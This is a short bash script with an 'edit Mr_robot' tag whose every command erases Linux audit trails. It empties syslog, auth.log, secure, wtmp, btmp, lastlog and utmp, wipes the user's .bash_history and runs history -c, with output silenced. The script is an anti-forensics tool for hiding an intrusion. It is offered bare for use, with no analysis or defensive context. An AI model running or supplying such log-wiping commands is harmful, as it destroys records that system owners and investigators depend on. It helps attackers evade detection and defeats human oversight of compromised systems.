#!/bin/bash
#edit Mr_robot
echo > /var/log/syslog   &> /dev/null
echo > /var/log/messages  &> /dev/null
echo > /var/log/xferlog  &> /dev/null
echo > /var/log/secure  &> /dev/null
echo > /var/log/auth.log  &> /dev/null
echo > /var/log/user.log  &> /dev/null
echo > /var/log/wtmp  &> /dev/null
echo > /var/log/lastlog  &> /dev/null
echo > /var/log/btmp  &> /dev/null
echo > /var/run/utmp  &> /dev/null
cd ~ && echo > .bash_history  &> /dev/null

history -c